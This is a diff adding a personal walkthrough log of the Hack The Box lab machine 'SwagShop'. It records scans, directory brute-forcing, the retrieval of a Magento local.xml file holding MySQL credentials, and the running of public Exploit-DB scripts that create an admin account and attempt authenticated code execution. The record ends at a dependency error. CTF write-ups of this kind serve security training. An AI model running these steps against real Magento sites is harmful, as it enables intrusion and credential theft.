@@ -1,0 +1,305 @@
+Machine-Name  :  SwagShop
+IP-Address    :  10.129.1.182
+
+Command-Line: sudo nmap -A 10.129.1.182
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-26 20:44 EST
+    Nmap scan report for 10.129.1.182
+    Host is up (0.063s latency).
+    Not shown: 998 closed ports
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
+    |   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
+    |_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
+    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+    |_http-server-header: Apache/2.4.18 (Ubuntu)
+    |_http-title: Did not follow redirect to http://swagshop.htb/
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=1/26%OT=22%CT=1%CU=38249%PV=Y%DS=2%DC=T%G=Y%TM=6010C58
+    OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=102%TI=Z%CI=I%II=I%TS=8)OPS(
+    OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
+    OS:NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(
+    OS:R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
+    OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
+    OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
+    OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+    OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
+    OS:S)
+
+    Network Distance: 2 hops
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    TRACEROUTE (using port 21/tcp)
+    HOP RTT      ADDRESS
+    1   64.70 ms 10.10.14.1
+    2   64.82 ms 10.129.1.182
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 22.56 seconds
+
+
+Wappalyzer
+Result:
+    Ecommerce
+    Cart Functionality
+    Magento
+
+    JavaScript frameworks
+    Prototype 1.7
+
+    Font scripts
+    Google Font API
+
+    Web servers
+    Apache 2.4.18
+
+    Programming languages
+    PHP
+
+    Operating systems
+    Ubuntu
+
+    Databases
+    MySQL
+
+    JavaScript libraries
+    Modernizr 2.6.2
+    jQuery 1.10.2
+    script.aculo.us
+
+
+Command-Line: php magescan.phar http://swagshop.htb
+Result:
+  app/etc/local.xml                            | 200           | Fail
+  Browser: http://swagshop.htb/app/etc/local.xml
+  Command-Line: wget http://swagshop.htb/app/etc/local.xml
+  Result: /local.xml
+
+Notes: Found username and password for mysql in /local.xml . root:fMVWh7bDHpgZkyfqQXreTjU9 . dbname = swagshop . key = b355a9e0cd018d3f7f03607141518419 . mysql4 .
+
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -e php,txt -t 50 -i 200,301,302 -u http://swagshop.htb
+Result:
+      _|. _ _  _  _  _ _|_    v0.4.1
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 63087
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-01-26_20-57-46.log
+
+    Target: http://swagshop.htb/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/swagshop.htb/_21-01-26_20-57-46.txt
+
+    [20:57:46] Starting:
+    [20:57:47] 301 -  315B  - /includes  ->  http://swagshop.htb/includes/
+    [20:57:47] 301 -  312B  - /media  ->  http://swagshop.htb/media/
+    [20:57:47] 301 -  310B  - /lib  ->  http://swagshop.htb/lib/
+    [20:57:47] 301 -  310B  - /app  ->  http://swagshop.htb/app/
+    [20:57:47] 301 -  310B  - /var  ->  http://swagshop.htb/var/
+    [20:57:47] 301 -  311B  - /skin  ->  http://swagshop.htb/skin/
+    [20:57:47] 301 -  313B  - /errors  ->  http://swagshop.htb/errors/
+    [20:57:47] 301 -  314B  - /pkginfo  ->  http://swagshop.htb/pkginfo/
+    [20:57:50] 301 -  312B  - /shell  ->  http://swagshop.htb/shell/
+    [20:57:50] 301 -  309B  - /js  ->  http://swagshop.htb/js/
+    [20:58:14] 200 -    1KB - /mage
+
+    Task Completed
+
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -e php,txt -t 50 -i 200,301,302 -u http://10.129.1.182
+Result:
+      _|. _ _  _  _  _ _|_    v0.4.1
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 63087
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-01-26_20-58-08.log
+
+    Target: http://10.129.1.182/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/10.129.1.182/_21-01-26_20-58-08.txt
+
+    [20:58:08] Starting:
+    [20:58:09] 301 -  312B  - /media  ->  http://10.129.1.182/media/
+    [20:58:09] 301 -  315B  - /includes  ->  http://10.129.1.182/includes/
+    [20:58:09] 301 -  309B  - /js  ->  http://10.129.1.182/js/
+    [20:58:09] 301 -  310B  - /lib  ->  http://10.129.1.182/lib/
+    [20:58:09] 301 -  310B  - /app  ->  http://10.129.1.182/app/
+    [20:58:09] 301 -  310B  - /var  ->  http://10.129.1.182/var/
+    [20:58:09] 301 -  311B  - /skin  ->  http://10.129.1.182/skin/
+    [20:58:09] 301 -  313B  - /errors  ->  http://10.129.1.182/errors/
+    [20:58:09] 301 -  314B  - /pkginfo  ->  http://10.129.1.182/pkginfo/
+    [20:58:09] 302 -    0B  - /.  ->  http://swagshop.htb/
+    [20:58:11] 301 -  312B  - /shell  ->  http://10.129.1.182/shell/
+    [20:58:39] 200 -    1KB - /mage
+
+    Task Completed
+
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -t 50 -i 200,301,302 -u http://swagshop.htb
+Result:
+      _|. _ _  _  _  _ _|_    v0.4.1
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 220520
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-01-26_20-56-17.log
+
+    Target: http://swagshop.htb/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/swagshop.htb/_21-01-26_20-56-18.txt
+
+    [20:56:18] Starting:
+    [20:56:18] 301 -  312B  - /media  ->  http://swagshop.htb/media/
+    [20:56:22] 301 -  315B  - /includes  ->  http://swagshop.htb/includes/
+    [20:56:22] 301 -  310B  - /lib  ->  http://swagshop.htb/lib/
+    [20:56:23] 301 -  310B  - /app  ->  http://swagshop.htb/app/
+    [20:56:23] 301 -  309B  - /js  ->  http://swagshop.htb/js/
+    [20:56:25] 301 -  312B  - /shell  ->  http://swagshop.htb/shell/
+    [20:56:25] 301 -  311B  - /skin  ->  http://swagshop.htb/skin/
+    [20:56:29] 301 -  310B  - /var  ->  http://swagshop.htb/var/
+    [20:56:31] 301 -  313B  - /errors  ->  http://swagshop.htb/errors/
+    [20:57:34] 200 -    1KB - /mage
+
+    Task Completed
+
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt -t 50 -i 200,301,302 -u http://10.129.1.182
+Result:
+      _|. _ _  _  _  _ _|_    v0.4.1
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, txt | HTTP method: GET | Threads: 50 | Wordlist size: 220520
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-21-01-26_20-56-19.log
+
+    Target: http://10.129.1.182/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/10.129.1.182/_21-01-26_20-56-23.txt
+
+    [20:56:23] Starting:
+    [20:56:24] 301 -  312B  - /media  ->  http://10.129.1.182/media/
+    [20:56:25] 301 -  315B  - /includes  ->  http://10.129.1.182/includes/
+    [20:56:25] 301 -  310B  - /lib  ->  http://10.129.1.182/lib/
+    [20:56:25] 301 -  310B  - /app  ->  http://10.129.1.182/app/
+    [20:56:25] 301 -  309B  - /js  ->  http://10.129.1.182/js/
+    [20:56:27] 301 -  312B  - /shell  ->  http://10.129.1.182/shell/
+    [20:56:27] 301 -  311B  - /skin  ->  http://10.129.1.182/skin/
+    [20:56:31] 301 -  310B  - /var  ->  http://10.129.1.182/var/
+    [20:56:32] 301 -  313B  - /errors  ->  http://10.129.1.182/errors/
+    [20:57:36] 200 -    1KB - /mage
+
+    Task Completed
+
+
+
+Browser: http://10.129.1.182/mage/
+Result:
+    #!/bin/sh
+
+    # REPLACE with your PHP5 binary path (example: /usr/local/php5/bin/php )
+    #MAGE_PHP_BIN="php"
+
+    MAGE_PHP_SCRIPT="mage.php"
+    DOWNLOADER_PATH='downloader'
+
+    # initial setup
+    if test "x$1" = "xmage-setup"; then
+        echo 'Running initial setup...'
+
+        if test "x$2" != "x"; then
+            MAGE_ROOT_DIR="$2"
+        else
+            MAGE_ROOT_DIR="`pwd`"
+        fi
+
+        $0 config-set magento_root "$MAGE_ROOT_DIR"
+        $0 config-set preferred_state beta
+        $0 channel-add http://connect20.magentocommerce.com/community
+        exit
+    fi
+
+    # check that mage pear was initialized
+
+    if test "x$1" != "xconfig-set" &&
+      test "x$1" != "xconfig-get" &&
+      test "x$1" != "xconfig-show" &&
+      test "x$1" != "xchannel-add" &&
+      test "x`$0 config-get magento_root`" = "x"; then
+        echo 'Please initialize Magento Connect installer by running:'
+        echo "$0 mage-setup"
+        exit;
+    fi
+
+    # find which PHP binary to use
+    if test "x$MAGE_PHP_BIN" != "x"; then
+      PHP="$MAGE_PHP_BIN"
+    else
+      PHP=php
+    fi
+
+
+    # get default pear dir of not set
+    if test "x$MAGE_ROOT_DIR" = "x"; then
+        MAGE_ROOT_DIR="`pwd`/$DOWNLOADER_PATH"
+    fi
+
+    exec $PHP -C -q $INCARG -d output_buffering=1 -d variables_order=EGPCS \
+        -d open_basedir="" -d safe_mode=0 -d register_argc_argv="On" \
+        -d auto_prepend_file="" -d auto_append_file="" \
+        $MAGE_ROOT_DIR/$MAGE_PHP_SCRIPT "$@"
+
+
+
+Command-Line: searchsploit magento
+Result:
+    ---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+     Exploit Title                                                                                                                                            |  Path
+    ---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+    eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                                                              | php/webapps/38573.txt
+    eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                                                                   | php/webapps/38651.txt
+    Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scripting                                                        | php/webapps/32808.txt
+    Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Site Scripting                                                  | php/webapps/32809.txt
+    Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                                                                                 | php/webapps/32810.txt
+    Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                                                            | php/webapps/39838.php
+    Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                                                                              | php/webapps/37811.py
+    Magento eCommerce - Local File Disclosure                                                                                                                 | php/webapps/19793.txt
+    Magento eCommerce - Remote Code Execution                                                                                                                 | xml/webapps/37977.py
+    Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                                                                    | php/webapps/35996.txt
+    Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                                                               | php/webapps/35052.txt
+    Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass                                                                              | php/webapps/48135.php
+    ---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+
+Notes: Taking a look at /php/webapps/37977.py
+Command-Line: searchsploit -x /php/webapps/37977.py
+Notes: Deciding to use the exploit.
+Command-Line: searchsploit -m /php/webapps/37977.py
+Result: /37977.py
+
+Notes: Changed target-ip and gave the username and password "uk47:uk47". Commented out all the extra characters.
+Command-Line: python 37977.py
+Result: "WORKED"
+
+Browser: http://swagshop.htb/index.php/admin
+Notes: Logged in SUCCESSFULLY with username and password: uk47:uk47
+
+Notes: Now that we have a username and password, let's try to use the "Authenticated" exploit from previously
+
+Command-Line: searchsploit -m php/webapps/37811.py
+Result: /37811.py
+
+Notes: Changed the 'username', 'password', and 'install_date' as requested in the file.
+
+Command-Line: python 37811.py http://swagshop.htb/index.php/admin 'whoami'
+Result:
+
+
+*** UNABLE TO USE PIP2.7 TO IMPORT MECHANIZE ***
